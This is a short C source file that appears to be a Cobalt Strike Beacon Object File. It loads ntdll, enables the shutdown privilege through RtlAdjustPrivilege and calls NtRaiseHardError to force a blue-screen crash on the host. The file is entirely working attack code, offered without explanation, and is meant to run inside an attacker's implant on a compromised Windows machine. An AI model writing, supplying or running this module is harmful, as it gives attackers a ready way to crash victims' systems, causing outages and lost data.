#include <windows.h>
#include "beacon.h"

WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR lpLibFileName);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);

void go(char * args, int alen) 
{
  HMODULE ntdll = KERNEL32$LoadLibraryA("ntdll.dll");
	BOOLEAN bEnabled;
	ULONG uResp;
	NTSTATUS(NTAPI *RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN) = (NTSTATUS(NTAPI *)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))KERNEL32$GetProcAddress(ntdll, "RtlAdjustPrivilege");
	NTSTATUS(NTAPI *NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG) = (NTSTATUS(NTAPI *)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG))KERNEL32$GetProcAddress(ntdll, "NtRaiseHardError");
	NTSTATUS NtRet = RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
	NtRaiseHardError(STATUS_ACCESS_VIOLATION, 0, 0, 0, 6, &uResp);
}
